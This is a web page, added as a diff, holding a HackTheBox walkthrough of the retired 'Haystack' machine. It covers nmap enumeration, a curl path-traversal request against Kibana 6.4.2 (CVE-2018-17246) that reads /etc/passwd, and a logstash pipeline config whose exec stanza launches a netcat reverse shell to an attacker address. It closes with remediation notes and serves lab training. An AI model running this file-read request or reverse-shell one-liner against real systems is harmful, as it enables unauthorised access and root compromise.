@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Haystack: Kibana LFI to creds, logstash config to root — Lucky Thandel</title>
+<meta name="description" content="Kibana 6.4.2 file read (CVE-2018-17246) exposes what logstash runs, and a writable pipeline config executed as root closes it. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-26 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Haystack: Kibana LFI to creds, logstash config to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Haystack is a retired HackTheBox easy Linux machine set in the Elastic stack. Synopsis: Kibana 6.4.2 file read (CVE-2018-17246) exposes credentials and config, and a writable logstash pipeline executed as root closes it.</p>
+<h2><span class="amber">$</span> Enumeration — version the stack</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: Elasticsearch plus Kibana</span>
+nmap -sC -sV -oN haystack.nmap 10.10.10.115   # 9200 elasticsearch, 5601 kibana 6.4.2</pre>
+<p>Kibana 6.4.2 maps to CVE-2018-17246, a console API file-read. Niche-versioned middleware is the whole attack surface here.</p>
+<h2><span class="amber">$</span> Foothold — Kibana LFI to creds</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: console LFI, then SSH</span>
+# Kibana console API file read (CVE-2018-17246):
+curl -s &quot;http://10.10.10.115:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../etc/passwd&quot;
+# pivot to app configs/key material -&gt; credentials -&gt; SSH as the service user</pre>
+<p>Read /etc/passwd to confirm, then aim at configs and key material — file reads become credential reads. SSH in as the low-privilege service user.</p>
+<h2><span class="amber">$</span> Privilege escalation — writable logstash pipeline</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: inject exec into the pipeline</span>
+ps aux | grep -i logstash   # running as root
+ls -l /etc/logstash/conf.d/   # writable by our user
+cat &gt; /etc/logstash/conf.d/privesc.conf &lt;&lt;EOF
+input { stdin { } }
+filter { }
+output { exec { command =&gt; &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4446 &gt;/tmp/f &amp;&quot; } }
+EOF
+nc -lvnp 4446   # wait for pipeline reload -&gt; root</pre>
+<p>Logstash running as root executes pipeline configs from a directory the compromised user can write to. Append an exec stanza, wait for reload, catch root. Privileged services consuming writable config are root by delegation. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Attacking Elasticsearch directly (the Kibana LFI is the intended lens) and writing the stanza in the wrong syntax (match the running config format, then reload).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch Kibana past the LFI, restrict stack ports to management networks, and lock pipeline dirs to root-only writes. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
